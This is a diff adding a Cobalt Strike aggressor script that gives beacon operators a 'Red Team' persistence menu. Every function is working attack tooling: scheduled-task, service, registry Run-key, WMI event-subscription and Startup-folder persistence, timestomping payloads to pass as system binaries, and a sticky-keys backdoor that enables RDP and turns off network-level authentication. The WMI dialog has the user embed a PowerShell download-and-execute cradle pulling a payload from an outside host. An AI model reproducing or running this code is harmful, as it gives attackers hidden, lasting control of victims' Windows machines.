@@ -1,0 +1,236 @@
+#Persistence Menu 
+#Author: @Qu1nn
+#Beacon menu for common methods used for Persistence
+
+popup beacon_top {
+	menu "&Red Team"{
+#Persistence Menu		
+		menu "&Persistence" {
+			item "&Schtasks Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					persistUserSchtasks($bid);
+				}
+			}
+			item "&Service EXE Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistCustomService($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}
+				}
+			}
+			item "&Registry Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					persistRegistry($bid);
+				}
+			}
+			item "&WMI Event using PowerPick" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistwmievent($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}	
+				}
+			}
+			item "&WMI Event Persistence using WMIC" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistwmieventwmic($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}
+				}
+			}
+			item "&Stickykeys(OSK) BackDoor Persistence (Need RDP Open)" {
+				local('$bid');
+				foreach $bid ($1) {
+					stickykeys($bid);
+				}
+			}	
+			item "&Windows Startup Persistence"{
+				local('$bid');
+				foreach $bid ($1) {
+					persistThroughStartUpFolder($bid);
+				}
+			}
+		}
+	}
+}
+
+
+#User Schtasks Persistence
+#Author: @Qu1nn
+#Runs as current user for the selected beacon
+#Meant for quick user level persistence upon initial access
+#Thanks to @noone and bluescreenofjeff for help
+
+sub persistUserSchtasks  {
+	$bid = $1;
+	$dialog = dialog("User Schtasks Persistence", %(taskname => "Evil Task Name..", targetpath => "Target Path..", user => "User to Run as..", schedule => "Schedule modifier..", payloadfile => "Select DLL Payload.."), lambda({
+		if ("$3['taskname']" ismatch 'Evil Task Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['payloadfile']" ismatch 'Select DLL Payload..' || "$3['user']" ismatch 'User to Run as..' || "$3['schedule']" ismatch 'Schedule modifier..') {
+			berror($bid, "\c4Please enter a valid Task Name, Target Path, and a valid Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			bshell($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
+			bshell($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+		}
+	}));
+
+	dialog_description($dialog, "User Schtasks Persistence - Generates a schtask for persistence on selected beacon.");
+	
+	drow_text($dialog, "taskname",  "Schtasks Taskname:");
+	drow_text($dialog, "user", "User to Run as:");
+	drow_text($dialog, "targetpath", "Target Path:");
+	drow_text($dialog, "schedule", "Schedule Modifier:");
+	drow_file($dialog, "payloadfile", "DLL Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Admin Level Custom Service EXE Persistence
+#Author: @Qu1nn
+#Runs as elevated user/SYSTEM for the selected beacon
+
+sub persistCustomService {
+	$bid = $1;
+	$dialog = dialog("Admin Level Custom Service EXE Persistence", %(servicename => "Custom Service Name..", display => "Display Name for Custom Service..", description => "Description for Custom Service..", targetpath => "Target Path..", payloadfile => "Select Payload.."), lambda({
+		if ("$3['servicename']" ismatch 'Custom Service Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['display']" ismatch 'Display Name for Custom Service..' || "$3['description']" ismatch 'Description for Custom Service..' || "$3['payloadfile']" ismatch 'Select Payload..') {
+			berror($bid, "\c4Please enter a valid Custom Service Name, Target Path, Display Name, Description and Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
+			bshell($bid, 'sc delete '.$3['servicename'].'');
+			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
+			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
+			bshell($bid, 'sc start '.$3['servicename'].'');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**");
+	
+	drow_text($dialog, "servicename",  "Custom Service Name:");
+	drow_text($dialog, "display", "Display Name for Custom Service:");
+	drow_text($dialog, "description", "Description for Custom Service:");
+	drow_text($dialog, "targetpath", "Target/Bin Path:");
+	drow_file($dialog, "payloadfile", "Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Registry Persistence
+#Author: @Qu1nn
+#Depending on Registry Location elevated access might be required
+
+sub persistRegistry {
+	$bid = $1;
+	$dialog = dialog("Registry Persistence", %(reglocation => "Registry Location..", keyname => "Key Name..", datatype => "Data Type..(REG_SZ)", keyvalue => "Key Value..(Payload)"), lambda({
+		if ("$3['reglocation']" ismatch 'Registry Location..' || "$3['keyname']" ismatch 'Key Name..' || "$3['datatype']" ismatch 'Data Type..(REG_SZ)' || "$3['keyvalue']" ismatch 'Key Value..(Payload)') {
+			berror($bid, "\c4Please enter a valid Registry Location, Key Name, Key Type, and a valid Payload Location.");
+			break;
+		}
+		else {
+			bshell($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
+			bshell($bid, 'reg query "'.$3['reglocation'].'"');
+		}
+	}));
+
+	dialog_description($dialog, "Registry Persistence - Creates a custom Registry Entry for persistence on selected beacon. **HKLM\\ could require elevated access.");
+	
+	drow_text($dialog, "reglocation",  "Registry Location:");
+	drow_text($dialog, "keyname", "Registry Key Name:");
+	drow_text($dialog, "datatype", "Registry Key Type:");
+	drow_text($dialog, "keyvalue", "Registry Key Value..(Payload Location):");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Permanent WMI Event using WMIC Persistence
+#Author: @Qu1nn
+#Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon
+#Very syntax heavy, Test first before using on live targets
+
+sub persistwmieventwmic {
+	$bid = $1;
+	$dialog = dialog("Permanent WMI Event using WMIC Persistence", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", eventconsumer => "CommandLineEventConsumer Name..(Must be different from __EventFilter Name)", commandline => "CommandLineTemplate Syntax..(powershell.exe -w hidden -enc)", payloadfile => "Encoded Payload String.."), lambda({
+		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['eventconsumer']" ismatch 'CommandLineEventConsumer Name..(Must be different from __EventFilter Name)' || "$3['commandline']" ismatch 'CommandLineTemplate Syntax..(powershell.exe -w hidden)' || "$3['payloadfile']" ismatch 'Select Encoded Payload..') {
+			berror($bid, "\c4Please enter a valid Custom __EventFilter Name, Event Query, CommandLineEventConsumer Name, Command Line Options, and the Encoded Payload File.");
+			break;
+		}
+		else {
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** ");
+	
+	#base 64 encode IEX of the powershell one liner
+	#cat payload.txt | iconv --to-code=UTF-16LE | base64
+	
+	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
+	drow_text($dialog, "eventquery", "Custom Event Query:");
+	drow_text($dialog, "eventconsumer", "Custom CommandLineEventConsumer Name:");
+	drow_text($dialog, "commandline", "Custom Command Line Options:");
+	drow_text($dialog, "payloadfile", "Custom Encoded Payload String:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+sub stickykeys {
+
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+	bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+	bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+	bshell($1, 'net start TermService');
+
+}
+
+sub persistThroughStartUpFolder {
+	$bid = $1;
+	$dialog = dialog("Start Up Folder Persistence", %(startup => "Startup Directory Folder..", payload => "Select Payload.."), lambda({
+		if ("$3['startup']" ismatch 'Startup Directory Folder..' || "$3['payload']" ismatch 'Select Payload..') {
+			berror($bid, "\c4Please enter a valid Startup Directory Folder, and select a Payload")
+			break;
+		}
+		else {
+			bshell($bid, 'cd "'.$3['startup'].'"');
+			bupload($bid, $3['payload']);
+			btimestomp($bid, "$3['payload']", "c:\\windows\\system32\\calc.exe");	
+		}
+	}));
+	dialog_description($dialog, "Start Up Folder Persistence - Generates a Startup Folder Entry and places a payload inside that folder. **Windows NT 6.0-10.0/All Users Location - %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Windows NT 6.0-10.0/Current User Location %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+
+	drow_text($dialog, "startup", "StartUp Directory Folder Location:");
+	drow_text($dialog, "payload", "Select Payload:");
+
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+}
